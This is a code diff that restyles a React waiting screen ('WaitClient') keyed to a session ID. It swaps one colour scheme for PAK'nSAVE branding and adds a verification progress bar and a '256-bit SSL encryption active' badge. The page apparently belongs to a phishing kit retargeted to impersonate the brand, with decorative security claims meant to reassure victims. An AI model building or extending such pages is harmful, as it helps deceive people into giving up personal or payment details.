@@ -40,12 +40,11 @@ export function WaitClient({ sessionId }: Props) {
   }
 
   return (
-    <div className="bg-[#f8fafc] min-h-screen relative z-50 overflow-hidden flex flex-col">
-      {/* Ambient Background Glows */}
-      <div className="absolute top-[-10%] left-[-10%] w-[500px] h-[500px] rounded-full bg-[#003b8f]/10 blur-[100px] animate-[pulse_6s_ease-in-out_infinite]" />
-      <div className="absolute bottom-[-10%] right-[-10%] w-[500px] h-[500px] rounded-full bg-[#f7a600]/10 blur-[100px] animate-[pulse_8s_ease-in-out_infinite_alternate]" />
+    <div className="relative z-50 flex min-h-screen flex-col overflow-hidden">
+      <div className="absolute left-[-12%] top-[-10%] h-[420px] w-[420px] rounded-full bg-[#ffd500]/10 blur-[110px]" />
+      <div className="absolute bottom-[-14%] right-[-8%] h-[420px] w-[420px] rounded-full bg-[#ffbf00]/10 blur-[120px]" />
 
-      <main className="flex-1 flex flex-col items-center justify-center p-4 w-full">
+      <main className="flex flex-1 flex-col items-center justify-center p-4 w-full">
         {!sessionId ? (
           <div className="flex justify-center relative z-10 w-full">
             <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-600 shadow-sm w-full max-w-sm">
@@ -53,53 +52,62 @@ export function WaitClient({ sessionId }: Props) {
             </p>
           </div>
         ) : (
-          <div className="w-full bg-white/90 backdrop-blur-xl rounded-[28px] shadow-[0_20px_60px_-15px_rgba(0,131,65,0.15)] p-8 md:p-10 flex flex-col items-center relative overflow-hidden border border-white/60 mx-auto max-w-[440px]">
-            {/* Top Security Banner */}
-            <div className="absolute top-0 left-0 w-full h-2 bg-gradient-to-r from-[#003b8f] via-[#7ec3eb] to-[#f7a600] bg-[length:200%_100%] animate-[pulse_3s_ease-in-out_infinite]" />
-            
-            {/* Shield Icon Container */}
-            <div className="relative flex items-center justify-center w-28 h-28 mb-6 mt-2">
-              {/* Soft pulsing background behind shield */}
-              <div className="absolute inset-0 bg-[#003b8f]/5 rounded-full animate-ping" style={{ animationDuration: '3s' }} />
-              
-              <div className="absolute inset-0 rounded-full border-[4px] border-[#003b8f]/10" />
-              <div className="absolute inset-0 animate-spin rounded-full border-[4px] border-transparent border-t-[#003b8f] border-r-[#7ec3eb]" style={{ animationDuration: '1.5s' }} />
-              
-              <svg className="w-11 h-11 text-[#003b8f]" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
-              </svg>
-            </div>
-
-            <h2 className="text-[24px] font-bold text-slate-800 mb-2 text-center tracking-tight">
-              {settings.wait_title}
-            </h2>
-            
-            <div className="h-[48px] flex items-center justify-center mb-6 w-full px-4">
-              <p 
-                key={messageIndex} 
-                className="text-center text-[15px] font-medium text-slate-500 animate-[fadeIn_0.5s_ease-in-out]"
-              >
-                {MESSAGES[messageIndex]}
-              </p>
-            </div>
-
-            {/* Progress Bar */}
-            <div className="w-full bg-slate-100 h-2.5 rounded-full overflow-hidden shadow-inner relative">
-              <div 
-                className="h-full bg-gradient-to-r from-[#003b8f] via-[#0057b8] to-[#7ec3eb] rounded-full transition-all duration-1000 ease-in-out relative" 
-                style={{ width: `${progressWidth}%` }} 
-              >
-                {/* Highlight gleam on progress bar */}
-                <div className="absolute top-0 left-0 w-full h-full bg-white/20 animate-[pulse_2s_ease-in-out_infinite]" />
+          <div className="pak-form-card fade-in mx-auto flex w-full max-w-[760px] flex-col overflow-hidden">
+            <div className="pak-form-inner px-6 pb-8 pt-8 sm:px-10 sm:pb-10 sm:pt-10">
+              <div className="mx-auto mb-6 flex w-full max-w-[560px] items-start justify-between gap-4">
+                <div>
+                  <h2 className="pak-form-title max-w-[14ch]">{settings.wait_title}</h2>
+                  <p className="pak-form-subtitle mt-3 max-w-[32rem]">
+                    We are securely processing your confirmation and validating your connection.
+                  </p>
+                </div>
+                <img
+                  src="/form-assets/paknsave-logo-form.png"
+                  alt="PAK'nSAVE"
+                  className="h-14 w-14 shrink-0 object-contain sm:h-16 sm:w-16"
+                />
               </div>
-            </div>
-            
-            {/* Footer Security Badge */}
-            <div className="mt-8 flex items-center justify-center gap-2 text-[13px] font-semibold text-[#003b8f]/70 bg-[#003b8f]/5 px-4 py-2 rounded-full border border-[#003b8f]/10">
-              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
-              </svg>
-              256-bit SSL encryption
+
+              <div className="mx-auto flex w-full max-w-[560px] flex-col items-center rounded-[28px] border border-[#ffd95c]/30 bg-[radial-gradient(circle_at_top,rgba(255,213,0,0.12),transparent_55%),linear-gradient(180deg,rgba(18,18,16,0.96),rgba(10,10,9,0.98))] px-6 py-8 shadow-[inset_0_1px_0_rgba(255,240,160,0.08)]">
+                <div className="relative mb-6 flex h-28 w-28 items-center justify-center">
+                  <div className="absolute inset-0 rounded-full border border-[#ffd95c]/20" />
+                  <div className="absolute inset-[10px] rounded-full border border-[#ffd500]/20" />
+                  <div className="absolute inset-0 animate-spin rounded-full border-[3px] border-transparent border-t-[#ffd500] border-r-[#ffe98c]" style={{ animationDuration: "1.7s" }} />
+                  <div className="absolute inset-[20px] rounded-full bg-[#ffd500]/10 blur-md" />
+                  <svg className="relative z-10 h-11 w-11 text-[#ffd500]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" />
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="m8.8 11.8 2.1 2.1 4.5-4.7" />
+                  </svg>
+                </div>
+
+                <div className="mb-6 min-h-[52px] px-3 text-center">
+                  <p key={messageIndex} className="text-base font-semibold leading-6 text-white/82 animate-[fadeIn_0.5s_ease-in-out]">
+                    {MESSAGES[messageIndex]}
+                  </p>
+                </div>
+
+                <div className="w-full">
+                  <div className="mb-2 flex items-center justify-between text-[11px] font-bold uppercase tracking-[0.14em] text-[#ffe98c]/80">
+                    <span>Verification</span>
+                    <span>{Math.round(progressWidth)}%</span>
+                  </div>
+                  <div className="h-3 overflow-hidden rounded-full border border-[#ffd95c]/30 bg-black/35">
+                    <div
+                      className="relative h-full rounded-full bg-[linear-gradient(90deg,#f3c400_0%,#ffe760_60%,#fff1a6_100%)] transition-all duration-1000 ease-in-out"
+                      style={{ width: `${progressWidth}%` }}
+                    >
+                      <div className="absolute inset-y-0 right-0 w-16 bg-white/30 blur-md" />
+                    </div>
+                  </div>
+                </div>
+
+                <div className="mt-8 pak-form-security justify-center text-center">
+                  <svg className="h-8 w-8 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
+                    <path d="M12 15v2m-6 4h12a2 2 0 0 0 2-2v-6a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2Zm10-10V7a4 4 0 0 0-8 0v4h8Z" strokeLinecap="round" strokeLinejoin="round" />
+                  </svg>
+                  <span>256-bit SSL encryption active</span>
+                </div>
+              </div>
             </div>
           </div>
         )}
